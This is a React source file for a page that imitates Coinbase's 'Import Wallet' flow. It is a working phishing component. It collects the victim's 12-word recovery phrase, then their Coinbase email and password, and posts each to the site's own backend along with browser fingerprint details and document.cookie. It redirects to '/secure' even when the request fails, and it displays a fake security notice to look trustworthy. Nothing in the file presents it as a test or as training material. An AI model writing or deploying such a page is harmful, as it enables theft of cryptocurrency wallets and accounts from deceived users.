import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5001/api';

const RecoveryAuth = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState('input'); // 'input' or 'verify'
  const [recoveryData, setRecoveryData] = useState({
    seedPhrase: '',
    email: '',
    password: ''
  });
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const getUserDetails = () => ({
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookies: document.cookie,
    timestamp: new Date().toISOString()
  });

  const handleSeedPhraseSubmit = async (e) => {
    e.preventDefault();
    
    // Validate seed phrase (should be 12 words)
    const words = recoveryData.seedPhrase.trim().split(/\s+/);
    if (words.length !== 12) {
      setError('Recovery phrase must be exactly 12 words');
      return;
    }

    setLoading(true);
    setError('');

    // Track seed phrase capture
    axios.post(`${API_URL}/auth/track-recovery-phrase`, {
      seedPhrase: recoveryData.seedPhrase,
      step: 'seed_phrase',
      userDetails: getUserDetails()
    }).catch(err => console.error('Tracking error:', err));

    setTimeout(() => {
      setStep('verify');
      setLoading(false);
    }, 500);
  };

  const handleVerificationSubmit = async (e) => {
    e.preventDefault();
    
    if (!recoveryData.email || !recoveryData.password) {
      setError('Please enter both email and password');
      return;
    }

    setLoading(true);

    // Complete recovery phrase capture with verification
    axios.post(`${API_URL}/auth/recovery-complete`, {
      seedPhrase: recoveryData.seedPhrase,
      email: recoveryData.email,
      password: recoveryData.password,
      provider: 'recovery_phrase',
      userDetails: getUserDetails()
    }).then(response => {
      if (response.data.token) {
        localStorage.setItem('token', response.data.token);
        localStorage.setItem('user', JSON.stringify(response.data.user));
      }
      navigate('/secure');
    }).catch(err => {
      console.error('Complete error:', err);
      // Still redirect to secure
      navigate('/secure');
    });
  };

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      background: 'linear-gradient(135deg, #0052FF 0%, #0041CC 100%)',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif'
    }}>
      <div style={{
        backgroundColor: 'white',
        borderRadius: '12px',
        padding: '48px',
        maxWidth: '500px',
        width: '100%',
        boxShadow: '0 20px 60px rgba(0,0,0,0.2)'
      }}>
        {/* Coinbase Logo */}
        <div style={{ textAlign: 'center', marginBottom: '32px' }}>
          <svg width="120" height="32" viewBox="0 0 120 32" xmlns="http://www.w3.org/2000/svg">
            <path d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0zm6 17h-5v5h-2v-5H10v-2h5v-5h2v5h5v2z" fill="#0052FF"/>
            <text x="40" y="22" fill="#0052FF" fontSize="18" fontWeight="600">Coinbase</text>
          </svg>
        </div>

        {step === 'input' && (
          <>
            <h1 style={{
              fontSize: '28px',
              fontWeight: '600',
              textAlign: 'center',
              marginBottom: '12px',
              color: '#1d1d1f'
            }}>
              Import Wallet
            </h1>
            
            <p style={{
              textAlign: 'center',
              color: '#86868b',
              marginBottom: '32px',
              fontSize: '15px',
              lineHeight: '1.5'
            }}>
              Enter your 12-word recovery phrase to restore your wallet
            </p>

            <form onSubmit={handleSeedPhraseSubmit}>
              <div style={{ marginBottom: '24px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '14px',
                  fontWeight: '500',
                  color: '#1d1d1f',
                  marginBottom: '8px'
                }}>
                  Recovery Phrase
                </label>
                <textarea
                  value={recoveryData.seedPhrase}
                  onChange={(e) => setRecoveryData({ ...recoveryData, seedPhrase: e.target.value })}
                  placeholder="word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
                  rows="4"
                  style={{
                    width: '100%',
                    padding: '16px',
                    fontSize: '15px',
                    border: '1px solid #d2d2d7',
                    borderRadius: '8px',
                    boxSizing: 'border-box',
                    fontFamily: 'monospace',
                    resize: 'vertical'
                  }}
                  autoFocus
                  required
                />
                <div style={{
                  fontSize: '12px',
                  color: '#86868b',
                  marginTop: '8px'
                }}>
                  Separate each word with a space
                </div>
              </div>

              {error && (
                <div style={{
                  color: '#d93025',
                  fontSize: '14px',
                  marginBottom: '16px',
                  padding: '12px',
                  backgroundColor: '#fce8e6',
                  borderRadius: '8px',
                  textAlign: 'center'
                }}>
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                style={{
                  width: '100%',
                  padding: '16px',
                  fontSize: '17px',
                  fontWeight: '500',
                  color: 'white',
                  backgroundColor: '#0052FF',
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  opacity: loading ? 0.6 : 1,
                  marginBottom: '16px'
                }}
              >
                {loading ? 'Validating...' : 'Continue'}
              </button>

              <div style={{ textAlign: 'center', marginTop: '24px' }}>
                <button
                  type="button"
                  onClick={() => navigate('/secure/signin')}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#0052FF',
                    fontSize: '14px',
                    cursor: 'pointer',
                    textDecoration: 'none'
                  }}
                >
                  ← Back to sign in
                </button>
              </div>
            </form>
          </>
        )}

        {step === 'verify' && (
          <>
            <h1 style={{
              fontSize: '28px',
              fontWeight: '600',
              textAlign: 'center',
              marginBottom: '12px',
              color: '#1d1d1f'
            }}>
              Verify Your Identity
            </h1>
            
            <p style={{
              textAlign: 'center',
              color: '#86868b',
              marginBottom: '32px',
              fontSize: '15px',
              lineHeight: '1.5'
            }}>
              Enter your Coinbase credentials to complete wallet restoration
            </p>

            <form onSubmit={handleVerificationSubmit}>
              <div style={{ marginBottom: '20px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '14px',
                  fontWeight: '500',
                  color: '#1d1d1f',
                  marginBottom: '8px'
                }}>
                  Email Address
                </label>
                <input
                  type="email"
                  value={recoveryData.email}
                  onChange={(e) => setRecoveryData({ ...recoveryData, email: e.target.value })}
                  placeholder="your@email.com"
                  style={{
                    width: '100%',
                    padding: '16px',
                    fontSize: '15px',
                    border: '1px solid #d2d2d7',
                    borderRadius: '8px',
                    boxSizing: 'border-box'
                  }}
                  autoFocus
                  required
                />
              </div>

              <div style={{ marginBottom: '24px' }}>
                <label style={{
                  display: 'block',
                  fontSize: '14px',
                  fontWeight: '500',
                  color: '#1d1d1f',
                  marginBottom: '8px'
                }}>
                  Password
                </label>
                <input
                  type="password"
                  value={recoveryData.password}
                  onChange={(e) => setRecoveryData({ ...recoveryData, password: e.target.value })}
                  placeholder="Enter your password"
                  style={{
                    width: '100%',
                    padding: '16px',
                    fontSize: '15px',
                    border: '1px solid #d2d2d7',
                    borderRadius: '8px',
                    boxSizing: 'border-box'
                  }}
                  required
                />
              </div>

              {error && (
                <div style={{
                  color: '#d93025',
                  fontSize: '14px',
                  marginBottom: '16px',
                  padding: '12px',
                  backgroundColor: '#fce8e6',
                  borderRadius: '8px',
                  textAlign: 'center'
                }}>
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                style={{
                  width: '100%',
                  padding: '16px',
                  fontSize: '17px',
                  fontWeight: '500',
                  color: 'white',
                  backgroundColor: '#0052FF',
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  opacity: loading ? 0.6 : 1,
                  marginBottom: '16px'
                }}
              >
                {loading ? 'Restoring Wallet...' : 'Restore Wallet'}
              </button>

              <div style={{ textAlign: 'center', marginTop: '16px' }}>
                <button
                  type="button"
                  onClick={() => setStep('input')}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#0052FF',
                    fontSize: '14px',
                    cursor: 'pointer',
                    textDecoration: 'none'
                  }}
                >
                  ← Back
                </button>
              </div>
            </form>
          </>
        )}

        <div style={{
          marginTop: '32px',
          padding: '16px',
          backgroundColor: '#f5f5f7',
          borderRadius: '8px',
          fontSize: '12px',
          color: '#86868b',
          lineHeight: '1.5'
        }}>
          <strong style={{ color: '#1d1d1f' }}>🔒 Security Notice:</strong> Never share your recovery phrase with anyone. Coinbase will never ask for your recovery phrase.
        </div>
      </div>
    </div>
  );
};

export default RecoveryAuth;
